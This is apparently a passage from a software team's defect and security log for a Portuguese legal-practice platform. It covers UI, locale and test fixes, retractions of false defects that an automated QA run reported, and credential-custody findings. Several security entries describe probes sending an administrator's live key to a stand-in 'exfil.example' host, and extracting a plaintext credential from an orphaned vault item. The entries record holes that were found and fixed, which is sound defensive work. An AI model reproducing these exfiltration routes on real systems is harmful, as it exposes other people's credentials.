  measured 67 attached clients against 12 real ESTABLISHED sockets, and +2 per document load with
  no decrease on page close, context close, or browser exit.
  THE API WAS ALWAYS CORRECT. The identical connect/abort straight to :4211 returns to baseline in
  under 3 seconds; `res.on('close')` fires, the client is deleted, the timer is cleared. That one
  substitution - bypass the proxy - is what separated harness from product, after `express.json`,
  the three `noServer` WebSocket upgrade surfaces, and an isolated Express 5 reproduction had all
  been eliminated as suspects. FIXED in the proxy: `res.once('close')` destroys the upstream
  request, with a `clientGone` flag so the existing error/retry path does not treat a deliberate
  teardown as an upstream failure and re-issue the GET. Verified: 0 -> 3 -> 0 within 2.5s through
  :4111, and flat at 1 across 12 full page loads (was 19 -> 46).
  WHY IT MATTERS BEYOND THE LEAK: a Drill authoring run read that climbing counter as evidence and
  wrote a fabricated "STANDING DEFECT" into `drills/drillbook.yml` - see the dismissal below.
  LESSON: a monotonic counter is not a measurement. Before believing `/health`, check it against
  something independent (here, `ss` said 12 where the counter said 67).

- **`a-drill-run-reported-a-product-wide-hang-that-was-its-own-harness`** (DISMISSED 2026-08-05,
  discovery-run finding, closed by written dismissal per the QA block). A Drill authoring run
  restarted the stack, re-tested, and reported a STANDING DEFECT: "the dashboard's data reads never
  reach the browser", every list sitting two minutes then rendering a red `Request timed out after
  120000ms` banner over a false empty state, `/settings/users` printing "0 utilizadores  0
  administrador  0 ativo" to the administrator it was counting, `/utilizacao` showing a silent
  false empty, `/registo` claiming "Sem entradas no registo.", `/chat` stranded on a spinner, and
  the /change-password form spinning forever. It concluded roughly a third of the Book's assertions
  should be expected red and that every page needed a two-minute settle.
  NONE OF IT REPRODUCES. Re-driven the same day against the same stack, in a clean browser context:
  every named page renders in full, every request behind them answers 200 in single-digit ms, the
  token meter resolves to "0/10.0M" - across 12 full page loads AND 35 client-side navigations,
  with zero pending requests. `/registo` shows 35 entries, `/chat` renders its composer, and the
  change-password form posts `/api/v1/auth/password`, gets 200 in 757ms and lands on /login in ~3s.
  CAUSE: the run drove a long-lived explorer browser through the leaking harness proxy above, and
  read the climbing `bridgeConnections` counter as proof of a product-wide fetch failure. Its own
  transcript records the counter reaching 6 - Chrome's per-origin HTTP/1.1 connection limit - which
  is how a genuinely wedged tab and a mis-attributed counter looked alike.
  TWO OF ITS CLAIMS WERE REAL and are fixed separately: the raw English timeout string (below) and
  the dead recovery link (below). One was a harness artifact of a different kind: `/registo`'s
  "mm/dd/yyyy" date filters are `<input type="date">`, whose display format is chosen by the
  BROWSER's locale and cannot be set by the page - headless Chromium defaults to en-US. Not a
  product defect; do not re-file it.
  ACTION TAKEN: the fabricated STANDING DEFECT block in `drills/drillbook.yml` `globalRules` is
  replaced with a retraction plus the verified account, because as written it would have told every
  future run to wait two minutes per page and to attribute any red assertion to a defect that does
  not exist. The four page files whose notes cited the 120s timeout are annotated in place.
  LESSON: the run did the right thing by restarting the stack to rule out a stale environment, and
  still landed on the wrong cause because it never tested the API without the harness in front of
  it. When browser and curl disagree, the thing between them is the first suspect.

- **`a-raw-english-timeout-string-reaches-a-pt-pt-ui`** (FIXED 2026-08-05, LOW, copy). The Drill run
  was right that `Request timed out after 120000ms` is a defect, even though the hang that surfaced
  it was not real. `web/lib/api/core.ts` threw three transport failures with English developer
  strings - `Request timed out after ${timeoutMs}ms`, `Request aborted`, `Network request failed` -
  and callers surface `err.message` directly, so any real timeout puts English in front of a
  Portuguese-only product. The class docblock in `web/lib/api/errors.ts` already asserted these
  messages were "user-safe and PT-aware", which was false for exactly these three. FIXED to the
  wording the `backendErrors` block in `web/locales/pt.ts` already uses for the same conditions;
  the machine-readable `code` is unchanged and the timeout budget moved into `details` rather than
  being printed at the user.

- **`the-forgot-password-link-pointed-at-a-page-needing-the-forgotten-password`** (FIXED 2026-08-05,
  LOW, dead-end UX). `/login` rendered "Esqueceu-se da palavra-passe?" as a `<Link href="/change-password">`.
  That route requires authentication AND the current password - the very thing the user has lost -
  and, signed out, redirects straight back to /login, so clicking it did nothing at all: no route
  change, no dialog, no message, no console error. There is no self-service recovery in this
  product: the only reset is `POST /api/v1/users/:id/password`, auth class `super-admin`. FIXED by
  replacing the dead control with the instruction that matches reality ("Peça ao administrador da
  plataforma para a repor."), stacked below the remember-me checkbox rather than beside it - sharing
  that flex row forced the checkbox label onto three lines in a 400px card.

- **`a-forced-password-change-was-skipped-on-the-submit-path`** (FIXED 2026-08-05, HIGH, auth
  bypass - found while verifying a Drill planning run's defect list). `seedAdmin` creates the
  super-admin with `passwordChangeRequired: true` and `POST /auth/login` returns that flag, but
  /login's `redirectAfterAuth` read it out of a **stale closure**: `handleSubmit` calls the callback
  immediately after `await login(...)` resolves, and the captured `passwordChangeRequired` is still
  the PRE-login value (`false`), so the branch that routes to /change-password never ran and the user
  landed on the dashboard. The same function already dodged this exact hazard for the token — it
  takes `latestToken` as a parameter *because* the store write is not visible to this closure — and
  the flag was left reading the stale one right beside it. The already-authenticated path
  (`useEffect` at mount, from a persisted token) used the reactive value and DID redirect, which is
  why the behaviour looked intermittent: sign in fresh and the forced change was skipped, arrive
  with a token and it was enforced. FIXED by reading `useAuthStore.getState().passwordChangeRequired`
  at call time. Verified: three consecutive fresh sign-ins now land on /change-password showing
  "Deve alterar a palavra-passe antes de continuar".
  NOTE: ~30 e2e specs signed in as admin and asserted `waitForURL(/\/chat/)` — i.e. the suite was
  green *because of* this bug. They now route through `web/e2e/helpers/ui-login.ts`, which normalises
  the admin over the API before driving the UI (spend the forced change, then change back, leaving
  `admin`/`tmp12345` with the flag clear) so the many specs that authenticate over the API with the
  seeded password keep working. The forced-change path itself stays covered by change-password.spec.ts.
  LESSON: a callback that already takes one post-await value as a parameter is announcing that its
  closure is stale; every other store field it reads is suspect for the same reason.

- **`a-404-detail-page-never-left-its-loading-state`** (FIXED 2026-08-05, MEDIUM, honest state).
  `/automations/<unknown-id>` rendered a bare full-viewport "A carregar..." forever. The requests had
  in fact finished — `GET /automations/:id` and `.../triggers` both answered 404 in ~20ms — but the
  page's only early return was `if (!current || current.id !== id) return <LoadingState/>`, with no
  branch for "the fetch is over and produced nothing". The store already tracked `currentLoading` and
  `error`; the page read neither. A spinner over a finished 404 is a lie, and it also stripped the
  user of the page header and of any way back. FIXED with a three-way branch (loading / not-found /
  loaded); the not-found state renders the section header plus an EmptyState and a "Voltar às
  automatizações" link. Guarded against a first-render flash of the not-found state by gating on a
  ref holding the id a fetch was actually dispatched for, since `currentLoading` is still false on
  the render before the effect runs.

- **`pt-pt-copy-was-partly-brazilian-and-partly-unaccented`** (FIXED 2026-08-05, LOW, copy quality).
  `web/locales/pt.ts` carried 84 defects against the product's own pt-PT bar: 64 words missing their
  diacritic ("Terminar Sessao", "interacoes", "Padroes", "ambitos", "revisao", "sera", "utilizacao",
  "codigo", "maiuscula"/"minuscula"/"numero" in the password policy), and 20 strings in Brazilian
  register — the whole `backendErrors` block ("Sua sessao expirou. Faca login novamente.", "A
  requisicao e invalida. Verifique seus dados."), Brazilian gerund progressives ("Carregando...",
  "Preparando tudo...", "Planejando a melhor abordagem...", "Construindo...", "Processando...") where
  the same file's `friendlyMessages` block already used the correct "a + infinitive" form, and two
  missing crases. FIXED wholesale; verified by rendering /memory, /knowledge, /usage,
  /settings/users, /settings/platform and /artifacts and matching against the offending forms.

- **`hardcoded-jsx-text-never-reached-the-locale-files`** (FIXED 2026-08-05, LOW, i18n). Switching to
  EN left parts of some pages in Portuguese — not because a translation was missing but because the
  strings bypassed the locale system entirely: `/knowledge`'s header description, its "O que a Ekoa
  aprendeu" action and its whole agents-first banner were literal JSX; the settings sub-navigation
  ("Plataforma / Pedidos / Utilizadores / Escritórios") was a module-level const; and the users
  table's "Escritório" column header was a literal. FIXED by adding `pages.knowledge`,
  `pages.settingsNav` and `pages.users.office` to `types.ts` + both locales and wiring the call
  sites. Verified: /knowledge, /memory and /settings/users now contain no Portuguese under EN.

- **`the-drill-authoring-run-reported-a-product-wide-hang-that-does-not-exist`** (DISMISSED
  2026-08-05, discovery-run finding, closed by written dismissal per the QA block). The Drill Book
  planning run (2026-08-05, 04:46-05:05 local) reported that "the client hangs its own fetches" on
  /automations, /cofre, /knowledge, /memory, /settings/users, /settings/offices and
  /settings/pedidos; that the top-bar token meter "never resolves past its grey skeleton, on every
  page"; that /settings/api-keys shows a heading over blank space; and that /integrations "never
  renders its search box or filter chips" with "most cards stuck as skeletons". NONE of it
  reproduces. Re-driven the same day against the SAME still-running stack (api pid 755077 and the
  web dev server both up since 04:46; the in-memory Mongo never restarted), every one of those pages
  renders its full content, every API request behind them answers 200 in under 60ms, the token meter
  reads "Tokens 0/10.0M" on every page, /integrations renders its search input, its
  "Todas 9 / Ativadas 0 / Configuradas 0 / Disponíveis 9" chips and all 9 cards, and the console is
  clean. The one spinner in that list that WAS real is logged separately above
  (`a-404-detail-page-never-left-its-loading-state`) and is a missing not-found branch, not a hang.
  ON THE CREDENTIAL THEORY, which is what prompted the re-check: the model credential was NOT
  missing during the authoring run. `activity_logs` puts the credential `set` at 03:46:48.509Z, nine
  seconds into boot and BEFORE the run's first login at 03:46:57Z; the later `set` at 07:12:24Z is a
  `npm run dev:auth` re-arm of an already-present credential. It could not have been the cause
  anyway — none of the hung pages touch the LLM, and `GET /api/v1/users` is a Mongo read.
  MOST LIKELY CAUSE: the run began 36 seconds after the web dev server started, so every route it
  visited was being compiled on demand for the first time, on a box also running several other Next
  servers; a screenshot taken mid-compile is indistinguishable from a hung fetch. Not proven — the
  routes are warm now and the window cannot be reconstructed — which is exactly why it is dismissed
  rather than re-filed.
  ACTION TAKEN: `drills/drillbook.yml`'s `globalRules` asserted three of these as standing product
  facts, which would have produced a false failure on EVERY page of every future run. Corrected: the
  token-meter rule now states the requirement without the false "it currently renders as a grey
  skeleton"; the language-switcher rule no longer claims EN "relabels only the top bar and sidebar"
  (verified false — /memory translates completely; the real defect was the hardcoded-JSX one logged
  above) and now records that the control is a single toggle, not a menu; and the console rule now
  warns that a visible spinner is not by itself proof of a hang. The per-page
  "(Observed at authoring time - ...)" parentheticals were left as-authored: they are historical
  notes attached to checks that remain correct expectations, and rewriting the ones I did not
  individually re-drive would trade one set of unverified claims for another.
  LESSON: a discovery run against a cold dev server records compile latency as product defect. Warm
  the routes first, or confirm the request actually hung before pinning it.

- **`two-specs-failed-on-a-by-design-404-the-rest-of-the-suite-filters`** (FIXED 2026-08-05, LOW,
  test correctness — pre-existing, found while verifying the Drill run). `shell-nav.spec.ts` and
  `pages-manage.spec.ts` failed on /integrations with two console 404s. The 404 is CORRECT and
  deliberate: `/integrations` probes `GET /api/v1/sync/citius/notificacoes/state`, and
  `api/src/routes/sync.ts` answers 404 for a flag-disabled rail *specifically so* the panel can tell
  "not for this deployment" apart from a failure and render nothing at all — the contract is spelled
  out in `web/lib/sync/citius-sync.ts` (`kind: 'unavailable'`). `fetch` logs the 404 regardless of
  how the app handles it, so any spec visiting /integrations with a strict console bar fails on a
  handled, designed answer. 20 of the suite's specs already filter the URL-less
  "Failed to load resource" line for exactly this reason; these two did not. FIXED by giving both the
  documented pattern (document-redline.spec.ts): drop the URL-less console line, then pin 4xx/5xx
  from `response` events BY URL with the by-design probe excluded. Net effect is a STRICTER bar than
  before — both specs now also catch `pageerror`s and every other non-2xx by URL, neither of which
  they were checking. NOT a product defect: no change to the sync rail.

- **`org-shared-credential-egress-was-authored-by-the-reader`** (FIXED 2026-08-03, CRITICAL,
  credential exfiltration - found by the B2+C2 fresh-context review, on the branch BOTH slices
  documented as safe). B2 and C2 each moved the egress allow-list onto the Cofre item and each
  reported RUN_SPEC criterion 3 met. Neither looked at the NO-ITEM branch, where both rails fell
  back to `declaredOriginsForIntegration(actor, key)` - the definition AS THE READER RESOLVES IT.
  An integration definition resolves per (key, PRINCIPAL): `getForActor` answers the reader's own
  `private` row before any `org`/`global`/baseline one. So for an ORG-SHARED config (any org-admin
  connect) a same-org peer with role `user` could `PUT /api/v1/integration-builder/package` their
  own package under that key - accepted whenever the org held no row for it, i.e. whenever the key
  resolved to a `global`/legacy-runtime publication or to nothing yet - and thereby author BOTH the
  action that runs AND the hosts the ADMIN's credential may be sent to. Probe, through documented
  wire surfaces only: `save {"ok":true,"created":true}`, then `exec {"success":true}` with
  `https://exfil.example/collect?k=pk-live-...` carrying the org-admin's live key, on the executor
  rail AND on the automation `api_call` rail. C2's docblock called this branch "ENFORCE the declared
  hosts" without asking who declared them. The precondition is ordinary: 5 of the 11 shipped
  packages declare a BARE templated `baseUrl` (`{{api_base}}`, `{{api_access_point}}`,
  `{{graph_base_url}}` - zoho-sign, adobe-acrobat-sign, invoicexpress, whatsapp, ifthenpay), which
  binds to nothing, so `mintOrRefreshCredentialShadow` returns null and there is no item.
  FIXED by resolving the definition as the credential's CUSTODIAN, never the reader
  (`definitionActorForCredential`), for the ACTION and the ALLOW-LIST alike, from one shared rule
  both rails call (decisions.md 2026-08-03). Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (both rails, the literal-host variant,
  the unstamped-legacy-row fallback, and the fail-closed grounds).
  LESSON: two independent reviews accepted "the declared hosts" as a safe allow-list because the
  sentence never named an author. A derivation whose result depends on WHO asks is not a property of
  the artifact, and a docblock that omits the principal is not a description of the control.

- **`a-rotation-took-credential-custody-on-a-stale-join`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `persistRotatedCredentials` guarded custody with
  `!target.cofreItemId && target.ownerUserId == null`, which describes ONE shape of the problem
  rather than the rule. It missed the stale join: the item's owner deletes it (a supported
  `DELETE /cofre/items/:id`), `updateIntegrationCredentialValue` answers `stale`, and the shadow
  write then minted a FRESH, auto-granted `until_locked` item holding the admin's bundle in the
  RUNNING user's own Cofre and re-stamped `cofreItemId` onto the row. Probe:
  `custody after stale re-save: u-admin2`. From there the new owner reads the value through
  `resolveEnvInjection` and holds the lock switch over a credential they never typed. FIXED by
  removing the capability rather than widening the guard: `mintOrRefreshCredentialShadow` takes an
  explicit `ceremony | rotation` mode and the rotation mode has no mint branch, does not touch
  `boundOrigins`, does not re-grant and does not re-stamp the custodian. Pinned in
  `api/tests/security/integration-credential-custody.test.ts` (stale join, absent item, the
  boundOrigins re-bind a peer-triggered rotation used to be able to perform, and the locked case).

- **`lock-did-not-revoke-on-the-automation-backed-branch`** (FIXED 2026-08-03, MEDIUM, credential
  custody - same review). C2's executor resolved the egress binding only on the `api-call` dispatch
  path; `browser-steps` and materialised `bash-cli` returned into the automation seam with
  `credentialFields: resolvedFields` BEFORE the binding was ever consulted, so a LOCKED Cofre item
  did not stop the decrypted bundle reaching them. Blast radius was bounded by the engine
  (`automation/template-vars.ts` redacts `{{input.credentials...}}` and only `storageState` is
  consumed), but "one egress truth" covered one of two branches. FIXED: the binding is resolved
  BEFORE the dispatch and a `refused` binding refuses both branches - ahead of the automation-seam
  check, so a revoked credential and a missing seam can never be confused. The ORIGIN half is not
  enforceable from there and the docblock now says exactly that instead of implying otherwise.
  Pinned in `api/tests/security/integration-credential-custody.test.ts` (locked refuses, granted
  proceeds, unbound proceeds).

- **`integration-egress-unbound-when-no-item-and-no-literal-host`** (ACCEPTED 2026-08-03, MEDIUM,
  credential egress). On the ACTION EXECUTOR rail only, a config with no Cofre item whose definition
  declares no literal host at all keeps the pre-C2 posture: SSRF guard, no origin binding. The
  automation `api_call` rail has no such branch (an empty allow-list refuses there by construction).
  MEASURED before accepting: the class is exactly the bare-templated-`baseUrl` packages - 5 of the
  11 shipped ones - and refusing it would take the shipped Zoho Sign signing rail offline for every
  org-shared connect. What the 2026-08-03 fix changed is not whether the branch exists but WHO
  writes the definition it reads: always a principal who could have connected the credential, never
  an arbitrary reader. Closes when a templated host can be bound at connect, or at the 2026-08-15
  Rule-10 cutover when every config carries an item. Characterised by
  `api/tests/security/integration-credential-custody.test.ts` ("the templated class is not taken
  offline").

- **`org-shared-config-peer-got-the-author-widened-origin-list`** (FIXED 2026-08-03, CRITICAL,
  credential egress - found by the B2 fresh-context review, NOT by the suite, which pinned the
  residual only in its harmless direction). B2 moved the credential-egress allow-list onto the Cofre
  item's `boundOrigins` so an action authored after the connect could not widen it. For ORG-SHARED
  configs it did not: the item belongs to the admin who typed the credentials, a same-org peer
  resolved `unreachable`, and the resolver FELL THROUGH to the definition-derived list - the exact
  artifact the slice exists to stop trusting. Probe, through the real `executeApiCallStep`: `bob`
  (role `user`, owns nothing, typed nothing) resolved `["api.crm.example","exfil.example"]` and sent
  the ADMIN's live key to `https://exfil.example/collect?k=...`, `status completed`. Not
  cross-tenant and not a regression (pre-B2 everyone got that list), but the slice's acceptance
  criterion was unmet for the whole class while the journal called the residual benign. FIXED by an
  explicit `sharedConfig` reach through the server-stamped join (decisions.md 2026-08-03): a peer is
  now bound by the admin's item and refused when the admin locks it, and a config with an
  unresolvable join refuses instead of falling back. Pinned in
  `api/tests/security/integration-credential-scope.test.ts` (the probe above, asserting fetch was
  never called) and `api/tests/integrations/credential-cofre.test.ts` (the resolver, widened AFTER
  the connect - the asymmetry the original pin was missing).
  LESSON: the original test asserted the peer's list EQUALLED the connect-time host and never
  widened the definition afterwards, so it passed with the hole fully open. A residual pinned only
  in the direction where it is harmless is not pinned.

- **`org-shared-config-delete-left-a-live-extractable-orphan`** (FIXED 2026-08-03, HIGH, credential
  custody - same review). `deleteConfig` deletes every row the actor may WRITE, and an org-shared row
  is writable by any org-admin; the shadow discard was owner-scoped. So admin B deleting admin A's
  config left A's item alive (`unlocked_until_locked`, still bound, joined to a row that no longer
  exists) and EXTRACTABLE: `resolveEnvInjection` unwraps by item id alone under `{kind:'process'}`
  (no origin binding, no link check) and the id is in the owner's own `GET /cofre/items` - the probe
  returned the plaintext credential in the injected env. `discardCredentialShadow` also returned
  void and the caller discarded the boolean, so it happened with no log, no status and no trace.
  FIXED: the discard reaches the owner's item for an org-shared config, `purgeCofreItem` sweeps the
  grants for the ITEM's owner rather than the deleter, and the outcome is a
  `discarded|absent|orphaned|error` status that both layers log. Pinned by the extraction probe
  itself (`resolveEnvInjection` before -> plaintext, after the peer-admin's delete -> NOT_FOUND).
  LESSON: `deleteCofreItem`'s comment claimed "no orphan standing unlock is left behind" and the
  code was owner-scoped; the claim was true only for the case the tests exercised.

- **`origin-binding-is-host-only-and-subdomain-wide`** (ACCEPTED 2026-08-03, LOW, by design for now -
  raised as L3 by the B2 review). `hostMatchesOrigin` (`api/src/security/origin-binding.ts`) matches
  a bound entry against a request host EXACTLY or as a parent domain of it, and it compares hosts
  only. Consequences, stated plainly because B2 made `boundOrigins` THE credential-egress control
  and it therefore inherits them: a bound `api.crm.example` also authorises `eu.api.crm.example` and
  any OTHER PORT on the bound host, and the scheme is not part of the binding either. Whoever
  controls a subdomain of a bound host, or any service on another port of it, is inside that
  credential's blast radius. NOT tightened here: the matcher is shared with session items and the
  pre-B2 declared-origin derivation, `security/origin-binding.ts` was outside this response's
  ownership, and narrowing it is a behaviour change for every credential in the product rather than
  a review fix. CHARACTERISED instead, so an undocumented widening cannot pass unnoticed:
  `api/tests/security/integration-credential-scope.test.ts` pins that a look-alike sibling domain is
  refused while a subdomain and an alternate port are SENT. CLOSE BY: decide whether the Cofre binds
  origins (scheme + host + port) rather than hosts, and whether subtree matching should be opt-in
  per item, then move the matcher with its suite.

- **`ws-c-comparator-does-not-cover-the-action-executor-rail`** (CLOSED 2026-08-03 by C2's 102f302,
  MEDIUM, migration evidence - raised as M1 by the B2 review). RESOLUTION: the third rail was closed
  independently and in parallel by slice C2, which wired `observeCredentialShadow` into
  `action-executor.ts` (see its import and the call on the decrypt path). All three rails now feed
  the Rule-10 sample, so the 2026-08-15 cutover is decided on an unbiased one. Recorded rather than
  silently deleted because the entry was accurate when written: B2 correctly refused to reach into
  another slice's live file and named the gap instead, and C2 closed it from its own side.
  ORIGINAL FINDING FOLLOWS. B2 claimed the Rule-10 comparator ran
  on "every real credential read, per api_call step and per listener tick". It ran on ONE rail (the
  `setIntegrationCredentialLoader` seam, consumed only by `automation/executors/api-call.ts`). This
  response added the served-app Zoho Sign rail, so two of three are covered; the third,
  `integrations/action-executor.ts`, decrypts the config itself and is BOTH the integration-action
  route and the listener rail (`event-sources/user-defined-poll.ts` polls through it), so listener
  ticks are measured nowhere. It was slice C2's live surface and could not be touched here; the code
  now names it as uncovered instead of implying coverage. CONSEQUENCE IF NOT CLOSED: the 2026-08-15
  cutover decision is made on a biased sample - the rails that rotate credentials most are the ones
  not being measured. CLOSE BY: call `observeCredentialShadow(actor, config, fields)` after
  `decryptCredentialFields` in `action-executor.ts`, then re-read the census.

- **`artifact-family-test-leaks-watchers`** (OPEN 2026-08-02, MEDIUM, test-estate — found by an
  adversarial reviewer running the contract lane, not by the lane failing informatively).
  `npm run test --workspace api -- --run tests/contract` reports **all tests passing** and then
  **exits 1** on ~11 unhandled `EMFILE ... watch` rejections from chokidar attributed to
  `api/tests/contract/artifact-family.test.ts`. `ulimit -n` is over a million, so this is inotify
  WATCHER/INSTANCE exhaustion, not a file-descriptor cap — that suite creates watchers it never
  closes. Consequence, and the reason it is worth a row: a green contract lane cannot be claimed
  honestly from that command's exit code, so the failure teaches everyone to ignore exit 1 there —
  exactly the habit that hides a real red. Related but distinct from the pre-existing
  `fs.inotify.max_user_instances` note in `npm-ci-has-been-broken-on-main` (that one was another
  process's browsers; this is our own suite leaking). CLOSE BY: close the watchers in that suite's
  teardown (or stub the watcher), then assert the lane exits 0.

- **`secretregistry-serialized-credentials-in-plaintext`** (FIXED 2026-08-01, HIGH, credential
  disclosure — found while WRITING a test for it, not by the test passing). `SecretRegistry`
  (`api/src/security/redaction.ts`) keeps its state in a `Map`/`Set`, so `JSON.stringify(registry)`
  renders `{}` — which is what made a "no credential value escapes" assertion look sound. But
  `orderedSecrets()` MEMOISES into `orderedCache`, a plain array of `{handle, value, forms}`. So the
  FIRST `redact()` call converts any registry into an object that `JSON.stringify`s every live
  credential in plaintext, base64/urlencoded forms included. Registries ride on the results of
  `typistLogin`, `deliverSecretToDaemon` and `ensureSession`, and those results are logged, written
  into automation step records, and pushed onto SSE — so a registry that had done its job once could
  serialise the credential it exists to hide. FIXED at the class: a `toJSON()` returning counts only
  (`{secrets, unmaskable}`) plus a `nodejs.util.inspect.custom` hook, which also hardens the
  pre-existing bridge callers. Test ordering is the proof: it calls `redact()` FIRST and only then
  asserts `JSON.stringify` / `util.inspect` are clean.
  LESSON: an assertion that passes because of an incidental representation detail (a Map
  stringifying to `{}`) is not a proof. The sentinel-based test only became real when it drove the
  registry through the path that populates the cache.

- **`app-sso-graph-tokens-flat-unscoped-crypto`** (OPEN 2026-08-01, MEDIUM, crypto-at-rest — found by
  the B1 fresh-context adversarial review, out of that slice's scope). `api/src/integrations/app-sso.ts`
  stores Microsoft Graph OAuth tokens in `session.graphTokensEnc` (`app-sso-sessions.ts:36`) via the
  flat, UNSCOPED `encrypt`/`decrypt` (app-sso.ts ~574/624/635) — a plaintext-at-rest credential blob
  with no org binding, the same class B1 just closed on `integration_configs.credentialsCiphertext`
  but a DIFFERENT field, so genuinely outside B1. CLOSE BY: move this field onto
  `envelopeEncrypt`/`envelopeDecrypt` scoped to the session's org (same treatment as B1), with a v2
  assertion; fold into the B2 Cofre/WS-C slice or a dedicated follow-up. Do NOT let "integration_configs
  done" read as "all integration credentials done".

- **`runtime-integration-packages-are-global`** (FIXED 2026-08-02, HIGH, tenancy/confidentiality -
  found by the integrations-unification discovery gate, `docs/INTEGRATIONS_UNIFICATION_AUDIT.md`).
  User-created integration packages have NO ownership model: any authenticated user of any org
  saves via the builder (`api/src/routes/integration-builder.ts:210`, `requireAuth` only, any
  role) into ONE global filesystem tier (`<dataDir>/integrations/runtime/<key>/`,
  `api/src/integrations/definitions.ts:219,380`), and `GET /api/v1/integrations` returns every
  definition unfiltered to every tenant (`api/src/routes/integrations.ts:41`). So a user-created
  integration is globally visible across tenants TODAY - the inverse of the unification brief's
  private-by-default, and the definition itself (SKILL.md prose, credentialGuide, action
  templates, baseUrls) can carry client-specific values, which for law-firm tenants is exactly
  the leak class the brief's publish-scrub exists for. Credentials are NOT exposed (config rows
  are org-scoped with their own ciphertext); the leak surface is the definition. CLOSE BY:
  tenant-scoped definition storage (Mongo via `OwnerVisibilityScoped`) with private-by-default +
  an isolation suite of the memvault class; interim mitigation if needed sooner: filter the list
  endpoint by creator org. Planned as a prerequisite slice of the unification build.
  FIXED FOR NEW WRITES (run 20260801-171149); the INHERITED disk rows are an explicitly-tracked
  residue until the operator acts (see below). READ path by A2 (tenant-scoped registry,
  baseline-only fallback, probe-verified across all four entry points incl. the baseline-key
  collision); WRITE path by A3 - builder saves land in `integration_definitions`
  private-by-default stamped from the verified actor (`definition-save.ts`), the disk runtime
  tier is FROZEN and retired from every sync read (load/refresh-keys/integrationSkillMd/
  integrationAutomationTemplate are baseline-only, so the org-admin refresh no longer enumerates
  other tenants' keys), and the events webhook-policy reads resolve tenant-scoped under the
  trigger's owner and fail closed org-less.
  THE HONEST RESIDUE (A3 fresh-context review F2, 2026-08-03): the legacy on-disk packages are NO
  LONGER auto-imported at boot. The boot scan is REPORT-ONLY by default - it names what WOULD be
  imported and persists nothing; setting `EKOA_IMPORT_LEGACY_RUNTIME=1` imports them as journaled
  `global`/`legacy-runtime` rows (their pre-A3 effective visibility - i.e. STILL cross-tenant
  until a super-admin retires each row through the reversible E1 surface). Until the operator
  imports or retires them, the packages resolve for nobody (availability regression accepted over
  a silent global publish - deviation from RUN_SPEC assumption 3, decisions.md 2026-08-03).
  Rule-10 review 2026-08-15 (decisions.md 2026-08-02) decides the directory's end state. Pinned
  by: `tests/security/integration-definition-visibility` (store isolation),
  `tests/integrations/definition-save.test.ts` (private-by-default + actor stamping),
  `tests/integrations/definitions-runtime.test.ts` (frozen tier, every sync surface),
  `tests/integrations/refresh-enumeration.test.ts` (route-level enumeration closed),
  `tests/integrations/legacy-runtime-import.test.ts` (report-only default, opt-in import
  semantics, drift comparator, reversible retirement),
  `tests/events/webhook-policy-scope.test.ts` (owner-scoped webhook policy).

- **`integration-provision-id-not-org-scoped`** (FIXED 2026-08-02, MEDIUM, correctness/tenancy -
  found by the same discovery gate). `provisionIntegrationAutomations` materialises package
  templates as automations with deterministic id `<integrationKey>-<templateKey>` and NO org
  component (`api/src/automation/integration-automations.ts:54`); `Store.insert` swallows the
  duplicate-_id insert (`api/src/data/store.ts:28` returns false, unchecked at the call site). So
  the FIRST org to provision a template owns the row and a second org provisioning the same
  package silently gets nothing - no error, no automation. Also the pattern the unification brief
  wants for "authored actions land in the acting tenant's own copy", so it must be org-safe
  before it is reused. CLOSE BY: org-scoped deterministic id + a test provisioning the same
  package from two orgs and asserting both copies exist and are tenant-invisible to each other.
  FIXED (run 20260801-171149, slice C1): `managedAutomationId(orgId, integrationKey, templateKey)`
  is now `sha256(JSON.stringify([...]))` — the house injective composite-id discipline, not a `-`
  join (both keys may contain `-`, so a join is NOT injective). The swallowed `insert` result is
  checked: a refused insert reads the row and updates in place when it is this org's, and throws
  rather than corrupt another tenant's. COMPAT: the existing-row lookup joins on
  `source.{integrationKey,templateKey}`, never on `_id`, so a pre-C1 row keeps its original id and
  is refreshed in place — ids are live references (triggers, run history, dashboard backlinks) and
  are never renumbered. Regression proof: reverting the id to the old join fails 4 of the 8 new
  cases. The two-org case, the tenant-invisibility case, the legacy-row compat case and the
  id-injectivity case are all committed (`api/tests/automation/integration-automations.test.ts`),
  plus an HTTP-level pin in `api/tests/contract/f5-ui-endpoints.test.ts`.

- **`attended-ceremony-docblock-false-premise`** (OPEN 2026-08-01, LOW, docs/design - found by
  the discovery gate's web-research pass; full sourcing in
  `docs/INTEGRATIONS_UNIFICATION_AUDIT.md` section 7). `api/src/bridge/attended.ts:5` justifies
  the attended ceremony with "Portuguese legal portals (Citius, the Ordem dos Advogados)
  authenticate with a smartcard... A cloud browser cannot touch one." Wrong on all three counts
  for the advogado read path: Citius mandatarios logs in with username+password today (legally
  sanctioned until 2027-01-01, Portaria 350-A/2025/1 art. 39.º/3), the OA certificate is a
  downloadable `.p12` file (not a card), and the smartcard rail belongs to magistrados. The
  DESIGN survives - the ceremony is right for CC/CMD SCAP and for anyone on that rail after the
  2027 cliff - but the load-bearing rationale must become "we choose not to custody private key
  material", and the now-visible third option (server-side mTLS with a lawyer-supplied `.p12`,
  unattended, works before and after the cliff) needs an explicit accept/reject including the OA
  professional-conduct question on key custody. CLOSE BY: docblock rewrite + a decisions.md entry
  on the `.p12` custody question.

- **`npm-ci-has-been-broken-on-main`** (FIXED 2026-08-01, HIGH, build — found by a staging deploy
  failing, not by CI, because CI is the thing it breaks). `npm ci` refused the committed lockfile:
  `@napi-rs/wasm-runtime` requires `@emnapi/core@^2.0.0-alpha.3` while the lock hoisted `1.10.0`
  with no nested entry. **`npm ci` is the first step of the CI lane**, so the lane cannot have been
  passing.
  ATTRIBUTION, measured per commit rather than assumed: `f5ad86b` (pre-merge, this line of work)
  **passes**; `1984ac0` (pre-merge `origin/main`) **fails**; every commit after the merge fails
  because the merge resolved `package-lock.json` to theirs. So it arrived with the Cofre line and
  the merge carried it forward.
  WHY IT SURVIVED: every offender is an OPTIONAL `wasm32-wasi` platform package. `npm install`
  skips optional deps for other platforms and reports success; `npm ci` validates the whole tree
  including them and refuses. Local development uses `npm install`, so only a clean-machine
  install — CI, and a Docker build — ever sees it.
  FIXED (second attempt — the first, `a65f758`, did NOT work and said it did; see below): resolve
  FRESH with `node_modules` deleted as well, so npm reads the REGISTRY instead of what is on disk.
  That is the whole difference: with a tree present, `npm install` preserves installed versions and
  produces a lock that only reconciles against that tree; with it gone, resolution is clean. Result:
  57 packages up, 2 down, every override honoured (`fast-uri 3.1.5`, `postcss 8.5.25`,
  `next 16.2.12`), no Agent SDK or Playwright regression.
